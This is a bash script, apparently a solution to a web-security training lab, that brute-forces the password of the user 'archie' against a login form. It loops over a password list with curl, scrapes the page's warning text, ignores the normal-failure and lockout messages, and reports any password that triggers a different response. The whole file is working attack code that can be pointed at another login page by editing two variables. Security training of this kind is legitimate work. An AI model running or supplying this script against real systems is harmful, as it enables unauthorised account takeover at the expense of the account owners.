#!/usr/bin/env bash

HOST="0a53006804f4f6f0827b02320074005f.web-security-academy.net"
NORMAL="Invalid username or password."
VICTIM="archie"
LIMIT="You have made too many incorrect login attempts. Please try again in 1 minute(s)."


while IFS= read -r p; do
	  msg=$(
	    curl -s -X POST "https://$HOST/login" \
	      --data-urlencode "username=$VICTIM" \
	      --data-urlencode "password=$p" \
	      | grep -oP '<p class=is-warning>\K.*(?=</p>)'
	  )

	if [[ "$msg" == "$NORMAL" ]]; then
	  # normal incorrect password, do nothing
	  :
	elif [[ "$msg" == "$LIMIT" ]]; then
	  :
	else
	  echo "[+] Possible valid password: $p | $msg"
	fi
  
done < pass_list.txt
	
